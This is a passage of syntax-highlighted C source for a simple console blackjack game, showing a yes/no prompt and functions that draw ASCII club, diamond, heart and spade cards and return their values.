string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, convinces user to enter yes</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 I told you so.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Club Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Diamond Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// End function</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span 